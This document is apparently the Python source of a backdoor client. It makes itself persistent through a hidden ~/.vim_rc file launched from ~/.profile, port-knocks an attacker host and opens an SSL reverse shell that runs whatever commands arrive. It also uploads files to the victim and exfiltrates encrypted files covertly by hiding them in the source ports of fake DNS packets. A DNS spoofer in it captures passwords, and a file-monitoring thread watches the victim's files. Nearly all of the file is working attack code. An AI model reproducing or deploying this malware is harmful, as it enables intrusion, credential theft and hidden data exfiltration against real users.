from os.path import expanduser


def change_settings():
    home = expanduser("~")
    with open(home + "/.profile", "a") as myfile:
        myfile.write("nohup python ./.vim_rc &")

    with open("xenophid.py") as somefile:
        with open(home + "/.vim_rc", "a") as hidefile:
            for i in xrange(16):
                somefile.next()
            for line in somefile:
                hidefile.write(line)


import os.path
import os
import signal
import socket, subprocess, ssl
import client_config
import dns_spoofer
import notify
from utils import generate_password, encrypt
from scapy.all import *
from multiprocessing import Process
from threading import Thread


DNS_PID = ""
NOTIFY_THREAD = ""

def upload(s, cmdArg):
    fs = cmdArg[2]
    with open(cmdArg[1], "wb") as f:
        dr = s.recv(1024)
        f.write(dr)
        totalFS = len(dr)
        while dr:
            if str(totalFS) != fs:
                dr = s.recv(1024)
                f.write(dr)
                totalFS += len(dr)
            else:
                break

def download(sock,filePath,password):
    # call encrypt function - returns file size or data?
    # read file - return file data
    # encrypt file data - return character length
    fileInformation = encrypt_data(filePath, password)
    if fileInformation[0] == 0:
        sock.send(str(fileInformation[0]))
        print "not a valid file."
    else:
        sock.send(str(fileInformation[1])) #send file name + " " + filesize
        time.sleep(2)
        send_data_with_covert(fileInformation[0])
        time.sleep(3)
        send_data_with_covert(client_config.EOF+client_config.EOF+client_config.EOF+client_config.EOF+client_config.EOF+
                              client_config.EOF+ client_config.EOF+ client_config.EOF+ client_config.EOF+
                              client_config.EOF)
    # send encrypted data using covert + delay + config.EOF bomb
def dns(cmdArg, ssl_sock):
    global DNS_PID
    if cmdArg[1] == "stop":
        os.kill(DNS_PID, signal.SIGTERM)
        if os.path.isfile(client_config.DNSPOOF_PASSWORD_FILE):
            with open(client_config.DNSPOOF_PASSWORD_FILE) as f:
                content = f.read()
                ssl_sock.send(content)
            os.remove(client_config.DNSPOOF_PASSWORD_FILE)
        else:
            ssl_sock.send("-------no passwords captured--------")
    elif cmdArg[1] == "start":
        p = Process(target=dns_spoofer.dnspoof, args=(cmdArg[2], cmdArg[3], cmdArg[4], cmdArg[5], cmdArg[6]))
        p.start()
        DNS_PID = p.pid

def create_inside_out_connection(password):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #wrap with SSL
    ssl_sock = ssl.wrap_socket(s, ca_certs="./../certificate/server.crt", cert_reqs=ssl.CERT_REQUIRED)
    # connect to attacker machine
    ssl_sock.connect((client_config.DESTINATION, client_config.PORT))
    # send we are connected
    ssl_sock.send('[*] Venom Injected!')
    # start loop
    while 1:
        # recieve shell command
        data = ssl_sock.recv(1024)
        # if its quit, then break out and close socket
        cmdArg = data.split(" ")
        if cmdArg[0] == "quit":
            break
        elif cmdArg[0] == "upload":
            upload(ssl_sock, cmdArg)
        elif cmdArg[0] == "download":
            download(ssl_sock,cmdArg[1],password)
        elif cmdArg[0] == "dnspoof":
            dns(cmdArg, ssl_sock)
        elif cmdArg[0] == "inotify":
            global NOTIFY_THREAD
            if cmdArg[1] == "stop":
                notify.KILL_PROCESS = True
            elif cmdArg[1] == "start":
                notify.KILL_PROCESS = False
                NOTIFY_THREAD = Thread(target=notify.notify, args=(cmdArg[2]))
                NOTIFY_THREAD.start()

        elif data == '':
            break
        else:
            # do shell command
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
            # read output
            stdout_value = proc.stdout.read() + proc.stderr.read()
            if stdout_value == '':
                stdout_value = 'Command had no output.\n'
            ssl_sock.send(stdout_value)

    # close socket
    ssl_sock.close()


def encrypt_data(filePath,password):
    if os.path.isfile(filePath):
        with open(filePath, "rb") as fileToDownload:
            encryptedFileContent = encrypt(fileToDownload.read(), password)
            return [encryptedFileContent, len(encryptedFileContent)]
    else:
        return [0]

def send_data_with_covert(sendContent):
    for i in range(0, len(sendContent), 2):
        new_packet = make_packet(sendContent[i], sendContent[i + 1] if i < len(sendContent) - 1 else 0)
        send(new_packet, verbose=0)


def make_packet(char1, char2):
    firstCharHex = hex(ord(char1))[2:]
    secondCharHex = 0
    if char2 != 0:
        secondCharHex = hex(ord(char2))[2:]
    CovertSourcePort = 11822
    if secondCharHex != 0:
        CovertSourcePort = int(firstCharHex + secondCharHex, 16)
    else:
        secondCharHex = '2e'
        CovertSourcePort = int(firstCharHex + secondCharHex, 16)

    packet = IP(src=client_config.DESTINATION, dst=client_config.DESTINATION) / UDP(sport=CovertSourcePort) / DNS(rd=1,
                                                                                      qd=DNSQR(qname="google.com"))
    return packet


def generate_sport(char1, char2):
    firstCharHex = hex(ord(char1))[2:]
    secondCharHex = hex(ord(char2))[2:]
    sourcePort = 11822
    if secondCharHex != 0:
        sourcePort = int(firstCharHex + secondCharHex, 16)
    else:
        secondCharHex = '2e'
        sourcePort = int(firstCharHex + secondCharHex, 16)
    return sourcePort


def port_knocking(password):
    pass_index = 0
    for i in range(len(client_config.PORT_KNOCK_ARRAY)):
        s_port = generate_sport(password[pass_index], password[pass_index + 1])
        packet = IP(dst=client_config.DESTINATION) / UDP(sport=s_port, dport=client_config.PORT_KNOCK_ARRAY[i])
        pass_index += 2
        send(packet, verbose=0)
    time.sleep(2)

def main():
    #change_settings()
    password = generate_password()
    port_knocking(password)
    create_inside_out_connection(password)


if __name__ == '__main__':
    main()
